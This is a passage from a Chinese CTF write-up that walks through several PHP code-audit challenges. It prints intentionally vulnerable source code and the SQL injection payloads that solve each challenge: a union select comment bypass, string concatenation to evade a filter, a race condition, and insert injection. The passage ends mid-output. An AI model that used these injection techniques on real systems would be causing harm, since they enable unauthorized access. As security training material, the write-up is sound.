<p>这里可以使用union all select绕过(原本用于防止重复数据合并)<br>最后构造（不断猜测到三列成功回显）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;\&amp;pw&#x3D;union all select 1,2,3 --%11</span><br></pre></td></tr></table></figure>
<p>成功回显<br>再次构造使$result[‘no’] === ‘31337’得到flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;\&amp;pw&#x3D;union all select 31337,31337,31337 --%11</span><br></pre></td></tr></table></figure>
<h2 id="0x0E-Name-check"><a href="#0x0E-Name-check" class="headerlink" title="0x0E Name check"></a>0x0E Name check</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;; </span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;name&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">       $name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">       if(preg_match(&quot;&#x2F;admin|--|;|\(\)|\&#x2F;\*|\\0&#x2F;i&quot;, $name))&#123;</span><br><span class="line">           echo &#39;Not allowed input&#39;;</span><br><span class="line">           goto quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql &#x3D; new SQLite3(&#39;name_check.db&#39;, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res &#x3D; $sql-&gt;query(&quot;</span><br><span class="line">           SELECT </span><br><span class="line">           MAX(&#39;0&#39;,&#39;1&#39;,&#39;&#123;$name&#125;&#39;) LIKE &#39;a%&#39;, </span><br><span class="line">           INSTR(&#39;&#123;$name&#125;&#39;,&#39;d&#39;)&gt;0, </span><br><span class="line">           MIN(&#39;&#123;$name&#125;&#39;,&#39;b&#39;,&#39;c&#39;) LIKE &#39;__m__&#39;, </span><br><span class="line">           SUBSTR(&#39;&#123;$name&#125;&#39;,-2)&#x3D;&#39;in&#39;</span><br><span class="line">       ;&quot;);</span><br><span class="line">       if($res &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">           echo &#39;Database error&#39;;</span><br><span class="line">           goto quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row &#x3D; $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       if(</span><br><span class="line">           $row[0] + $row[1] + $row[2] + $row[3] !&#x3D;&#x3D; 4 ||</span><br><span class="line">           array_sum($row) !&#x3D;&#x3D; 4 </span><br><span class="line">       )&#123;</span><br><span class="line">           echo &#39;Auth failed&#39;;</span><br><span class="line">           goto quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>可以看到我们需要： $row[0] + $row[1] + $row[2] + $row[3] === 4<br>即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">           MAX(&#39;0&#39;,&#39;1&#39;,&#39;&#123;$name&#125;&#39;) LIKE &#39;a%&#39;, </span><br><span class="line">           INSTR(&#39;&#123;$name&#125;&#39;,&#39;d&#39;)&gt;0, </span><br><span class="line">           MIN(&#39;&#123;$name&#125;&#39;,&#39;b&#39;,&#39;c&#39;) LIKE &#39;__m__&#39;, </span><br><span class="line">           SUBSTR(&#39;&#123;$name&#125;&#39;,-2)&#x3D;&#39;in&#39;</span><br><span class="line">       ;</span><br></pre></td></tr></table></figure>
<p>四个判断皆为true<br>不难看出：<br>需要的$name为”admin”<br>而恰好在preg_match(“/admin|–|;|()|/*|\0/i”, $name)处admin已被过滤<br>这里可以利用SQLite使用”||”连接字符串来进行注入，最终构造成’a’||’dmin’：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?name&#x3D;a%27||%27dmin</span><br></pre></td></tr></table></figure>
<p>回显即得flag</p>
<h2 id="0x0F-Super-secure-hash"><a href="#0x0F-Super-secure-hash" class="headerlink" title="0x0F Super secure hash"></a>0x0F Super secure hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   function super_secure_hash($text)&#123;</span><br><span class="line">       $hashed &#x3D; sha1(crc32($text));</span><br><span class="line">       $encoded &#x3D; base64_encode(hex2bin($hashed));</span><br><span class="line">       return $encoded;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function login_check($username, $password)&#123;</span><br><span class="line">       if(strlen($username) &gt; 4 &amp;&amp; strlen($password) &gt; 6)&#123;</span><br><span class="line"></span><br><span class="line">           $users &#x3D; json_decode(file_get_contents(__DIR__.&#39;&#x2F;users.json&#39;));</span><br><span class="line">           foreach($users as $user)&#123;</span><br><span class="line">               if($user-&gt;username &#x3D;&#x3D;&#x3D; $username)&#123;</span><br><span class="line">                   return $user-&gt;password &#x3D;&#x3D;&#x3D; super_secure_hash($password);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return false;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;username&#39;], $_GET[&#39;password&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">       if(login_check($_GET[&#39;username&#39;], $_GET[&#39;password&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">           if($_GET[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">               echo $flag;</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">               echo &#39;Hello, &#39;.$_GET[&#39;username&#39;].&#39;!&#39;;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           echo &#39;Wrong username or password..&#39;;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>不算是代码审计<br>更像是crc爆破<br>直接访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;users.json</span><br></pre></td></tr></table></figure>
<p>拿到json数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;G19qLfSByRqrTRS8in1qT\&#x2F;CWvnc&#x3D;&quot;&#125;,&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;vANiIasnT\&#x2F;+9Z5eyvy6H0BMjTgw&#x3D;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>查询sha1得到admin对应password的crc32为77236792<br>这里应该需要一个crc32为77236792且长度大于6的字符串<br>5/6位可直接使用github上的脚本秒解<br>而这里6位以上，需要爆破，不过没多少意义<br>因为与审计没多少关系，没去跑脚本</p>
<h2 id="0x10-I-am-slowly"><a href="#0x10-I-am-slowly" class="headerlink" title="0x10  I am slowly"></a>0x10  I am slowly</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    &#x2F;&#x2F; It&#39;s &#39;I am slowly&#39; problem of &#39;Solve Me&#39;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;; </span><br><span class="line"></span><br><span class="line">    $table &#x3D; &#39;iamslowly_&#39;.ip2long($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    $answer &#x3D; $_GET[&#39;answer&#39;];</span><br><span class="line"></span><br><span class="line">    if(isset($answer))&#123;</span><br><span class="line">        $con &#x3D; mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&#39;SQL server down&#39;);</span><br><span class="line"></span><br><span class="line">        $result &#x3D; mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT &#96;count&#96; FROM &#96;&#123;$table&#125;&#96;;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(!isset($result))&#123;</span><br><span class="line">            mysqli_query($con, &quot;CREATE TABLE IF NOT EXISTS &#96;&#123;$table&#125;&#96; (&#96;answer&#96; char(32) NOT NULL, &#96;count&#96; int(4) NOT NULL);&quot;);</span><br><span class="line">            $new_answer &#x3D; md5(sha1(&#39;iamslowly_&#39;.mt_rand().&#39;_&#39;.mt_rand().&#39;_&#39;.mt_rand()));</span><br><span class="line">            mysqli_query($con, &quot;INSERT INTO &#96;&#123;$table&#125;&#96; (&#96;answer&#96;,&#96;count&#96;) VALUES (&#39;&#123;$new_answer&#125;&#39;,1);&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;elseif($result[&#39;count&#39;] &#x3D;&#x3D;&#x3D; &#39;12&#39;)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE &#96;&#123;$table&#125;&#96;;&quot;);</span><br><span class="line">            echo &#39;Game over&#39;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime &#x3D; mt_rand(1, 10);</span><br><span class="line">        $result &#x3D; mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT * FROM &#96;&#123;$table&#125;&#96; WHERE sleep(&#123;$randtime&#125;) OR &#96;answer&#96;&#x3D;&#39;&#123;$answer&#125;&#39;;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(isset($result) &amp;&amp; $result[&#39;answer&#39;] &#x3D;&#x3D;&#x3D; $answer)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE &#96;&#123;$table&#125;&#96;;&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            mysqli_query($con, &quot;UPDATE &#96;&#123;$table&#125;&#96; SET &#96;count&#96;&#x3D;&#96;count&#96;+1;&quot;);</span><br><span class="line">            echo &#39;Go fast&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>首先看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($result) &amp;&amp; $result[&#39;answer&#39;] &#x3D;&#x3D;&#x3D; $answer)&#123;</span><br><span class="line">    mysqli_query($con, &quot;DROP TABLE &#96;&#123;$table&#125;&#96;;&quot;);</span><br><span class="line">    echo $flag;</span><br></pre></td></tr></table></figure>
<p>而answer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$new_answer &#x3D; md5(sha1(&#39;iamslowly_&#39;.mt_rand().&#39;_&#39;.mt_rand().&#39;_&#39;.mt_rand()));</span><br><span class="line">mysqli_query($con, &quot;INSERT INTO &#96;&#123;$table&#125;&#96; (&#96;answer&#96;,&#96;count&#96;) VALUES (&#39;&#123;$new_answer&#125;&#39;,1);&quot;);</span><br></pre></td></tr></table></figure>
<p>看到这里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($con, &quot;SELECT * FROM &#96;&#123;$table&#125;&#96; WHERE sleep(&#123;$randtime&#125;) OR &#96;answer&#96;&#x3D;&#39;&#123;$answer&#125;&#39;;&quot;)</span><br></pre></td></tr></table></figure>
<p>很明显的sql注入<br>不过同时注意到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elseif($result[&#39;count&#39;] &#x3D;&#x3D;&#x3D; &#39;12&#39;)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE &#96;&#123;$table&#125;&#96;;&quot;);</span><br><span class="line">            echo &#39;Game over&#39;;</span><br><span class="line">            goto quit;</span><br></pre></td></tr></table></figure>
<p>我们进行12次注入后，数据库便会被drop<br>这里要想办法绕过这个drop机制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先访问11次，使count为11</span><br><span class="line">进行注入，在判断count为12进行drop前sleep</span><br><span class="line">在第12次查询的sleep过程中访问一次</span><br><span class="line">这样利用php异步并发访问mysql跳过对count为12的验证</span><br></pre></td></tr></table></figure>
<p>而后可以无限次注入<br>盲注出answer即可</p>
<h2 id="0x11-Cheap-lottery"><a href="#0x11-Cheap-lottery" class="headerlink" title="0x11 Cheap lottery"></a>0x11 Cheap lottery</h2><p>开始没啥思路<br>fuzz发现robots.txt<br>进而拿到源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;backup&#x2F;</span><br></pre></td></tr></table></figure>
<p>有效部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require __DIR__.&quot;&#x2F;_config.php&quot;;</span><br><span class="line">	$sql &#x3D; new mysqli($sql_host, $sql_username, $sql_password, $sql_dbname) or die(&quot;SQL Server Down T.T&quot;);</span><br><span class="line"></span><br><span class="line">	$name &#x3D; &quot;guest_&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">	$result &#x3D; $sql-&gt;query(&quot;SELECT * FROM &#96;lottery&#96; WHERE &#96;name&#96;&#x3D;&#39;&#123;$name&#125;&#39;;&quot;);</span><br><span class="line">	$row_guest &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">	unset($name, $result);</span><br><span class="line"></span><br><span class="line">	if(isset($_GET[&#39;lottery&#39;]) &amp;&amp; is_array($_GET[&#39;lottery&#39;]) &amp;&amp; count($_GET[&#39;lottery&#39;]) &#x3D;&#x3D; 5)&#123; &#x2F;&#x2F; buy request</span><br><span class="line"></span><br><span class="line">		if(isset($row_guest))&#123; &#x2F;&#x2F; already bought</span><br><span class="line"></span><br><span class="line">			$msg &#x3D; &quot;You already bought a lottery ticket at &quot;.date(&#39;Y-m-d H:i:s&#39;, $row_guest[&#39;time&#39;]).&quot;.&quot;;</span><br><span class="line">			$buy_enable &#x3D; false;</span><br><span class="line"></span><br><span class="line">		&#125;else&#123; &#x2F;&#x2F; not bought yet, but buy now</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; insert real answer</span><br><span class="line">			$name &#x3D; &quot;admin_&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">			$time &#x3D; time();</span><br><span class="line">			$nums &#x3D; implode(&quot;,&quot;, [ mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100) ]);</span><br><span class="line">			$sql-&gt;query(&quot;INSERT INTO &#96;lottery&#96;(&#96;name&#96;, &#96;time&#96;, &#96;nums&#96;) VALUE(&#39;&#123;$name&#125;&#39;, &#39;&#123;$time&#125;&#39;, &#39;&#123;$nums&#125;&#39;);&quot;);</span><br><span class="line">			unset($name, $time, $nums);</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; insert my answer</span><br><span class="line">			$name &#x3D; &quot;guest_&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">			$time &#x3D; time();</span><br><span class="line"></span><br><span class="line">			$url_query &#x3D; urldecode(parse_url($_SERVER[&#39;REQUEST_URI&#39;], PHP_URL_QUERY));</span><br><span class="line">			$nums &#x3D; preg_replace(&quot;&#x2F;[a-zA-Z\[\]\&#x3D;]&#x2F;&quot;, &quot;&quot;, $url_query);</span><br><span class="line">			$nums &#x3D; strtr($nums, &quot;&amp;&quot;, &quot;,&quot;);</span><br><span class="line">			$sql-&gt;query(&quot;INSERT INTO &#96;lottery&#96;(&#96;name&#96;, &#96;time&#96;, &#96;nums&#96;) VALUE(&#39;&#123;$name&#125;&#39;, &#39;&#123;$time&#125;&#39;, &#39;&#123;$nums&#125;&#39;);&quot;);</span><br><span class="line">			unset($name, $time, $url_query, $nums);</span><br><span class="line"></span><br><span class="line">			$msg &#x3D; &quot;You bought a lottery ticket. Please wait 60 sec.&quot;;</span><br><span class="line">			$buy_enable &#x3D; false;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;else&#123; &#x2F;&#x2F; not buy request</span><br><span class="line"></span><br><span class="line">		if(isset($row_guest))&#123; &#x2F;&#x2F; already bought</span><br><span class="line"></span><br><span class="line">			if(intval($row_guest[&#39;time&#39;]) + 60 &lt;&#x3D; time())&#123; &#x2F;&#x2F; publish result</span><br><span class="line"></span><br><span class="line">				$name &#x3D; &quot;admin_&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">				$result &#x3D; $sql-&gt;query(&quot;SELECT * FROM &#96;lottery&#96; WHERE &#96;name&#96;&#x3D;&#39;&#123;$name&#125;&#39;;&quot;);</span><br><span class="line">				$row_admin &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">				unset($name, $result);</span><br><span class="line"></span><br><span class="line">				&#x2F;&#x2F; check answer</span><br><span class="line">				$bingo &#x3D; 0;</span><br><span class="line">				$nums_admin &#x3D; explode(&quot;,&quot;, $row_admin[&#39;nums&#39;]); &#x2F;&#x2F; admin_*</span><br><span class="line">				$nums_guest &#x3D; explode(&quot;,&quot;, $row_guest[&#39;nums&#39;]); &#x2F;&#x2F; guest_*</span><br><span class="line">				for($i &#x3D; 0; $i &lt; 5; ++$i)&#123;</span><br><span class="line">					for($k &#x3D; 0; $k &lt; 5; ++$k)&#123;</span><br><span class="line">						if(isset($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] &#x3D;&#x3D;&#x3D; $nums_guest[$k])&#123;</span><br><span class="line">							++$bingo;</span><br><span class="line">							unset($nums_guest[$k]);</span><br><span class="line">							break;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				unset($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line">				if($bingo &#x3D;&#x3D; 5)&#123; &#x2F;&#x2F; correct all</span><br><span class="line">					$msg &#x3D; &quot;Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;&#x2F;code&gt;.&quot;;</span><br><span class="line"></span><br><span class="line">				&#125;elseif($bingo &gt; 0)&#123; &#x2F;&#x2F; correct</span><br><span class="line">					$msg &#x3D; &quot;Excellent! You matched &#123;$bingo&#125; numbers. :)&quot;;</span><br><span class="line"></span><br><span class="line">				&#125;else&#123; &#x2F;&#x2F; incorrect</span><br><span class="line">					$msg &#x3D; &quot;Oops! You did not even match one. :(&quot;;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">				$buy_enable &#x3D; true;</span><br><span class="line"></span><br><span class="line">				$name_admin &#x3D; &quot;admin_&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">				$name_guest &#x3D; &quot;guest_&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">				$sql-&gt;query(&quot;DELETE FROM &#96;lottery&#96; WHERE &#96;name&#96; IN (&#39;&#123;$name_admin&#125;&#39;, &#39;&#123;$name_guest&#125;&#39;);&quot;);</span><br><span class="line">				unset($name, $name_admin, $name_guest);</span><br><span class="line"></span><br><span class="line">			&#125;else&#123;</span><br><span class="line"></span><br><span class="line">				$msg &#x3D; &quot;Please wait until at &quot;.date(&#39;Y-m-d H:i:s&#39;, intval($row_guest[&#39;time&#39;]) + 60).&quot;.&quot;;</span><br><span class="line">				$buy_enable &#x3D; false;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;else&#123; &#x2F;&#x2F; not bought</span><br><span class="line"></span><br><span class="line">			$msg &#x3D; &quot;Oh, Please buy a lottery ticket. It&#39;s free!&quot;;</span><br><span class="line">			$buy_enable &#x3D; true;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>首先没看出什么逻辑漏洞<br>程序最后通过比较：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for($i &#x3D; 0; $i &lt; 5; ++$i)&#123;</span><br><span class="line">       for($k &#x3D; 0; $k &lt; 5; ++$k)&#123;</span><br><span class="line">                if(isset($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] &#x3D;&#x3D;&#x3D; $nums_guest[$k])&#123;</span><br><span class="line">                       ++$bingo;</span><br><span class="line">                       unset($nums_guest[$k]);</span><br><span class="line">                       break;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>看到存在sql注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql-&gt;query(&quot;INSERT INTO &#96;lottery&#96;(&#96;name&#96;, &#96;time&#96;, &#96;nums&#96;) VALUE(&#39;&#123;$name&#125;&#39;, &#39;&#123;$time&#125;&#39;, &#39;&#123;$nums&#125;&#39;);&quot;);</span><br></pre></td></tr></table></figure>
<p>思路很简单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql注入的时候insert一个admin_addr和guest_addr(addr为vps_ip)</span><br><span class="line">这样在最后表被删除时，再用vps访问(不带有查询参数)，便会直接进入判断的过程</span><br><span class="line">而在注入时admin和guest数据设为相同，便会使$bingo &#x3D;&#x3D; 5，从而得到flag</span><br></pre></td></tr></table></figure>
<p>不过这里对参数存在过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&quot;&#x2F;[a-zA-Z\[\]\&#x3D;]&#x2F;&quot;, &quot;&quot;, $url_query);</span><br></pre></td></tr></table></figure>
<p>到这里卡住了<br>看了这里学习了一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;skysec.top&#x2F;2018&#x2F;03&#x2F;21&#x2F;从一道题深入mysql字符集与比对方法collation&#x2F;</span><br></pre></td></tr></table></figure>
<p>下面直接引用一些知识：<br>长亭p神的文章：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;mysql-charset-trick.html</span><br></pre></td></tr></table></figure>
<p>在mysql中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#39;character_set_%&#39;;</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">| Variable_name            | Value                      |</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">| character_set_client     | latin1                     |</span><br><span class="line">| character_set_connection | latin1                     |</span><br><span class="line">| character_set_database   | latin1                     |</span><br><span class="line">| character_set_filesystem | binary                     |</span><br><span class="line">| character_set_results    | latin1                     |</span><br><span class="line">| character_set_server     | 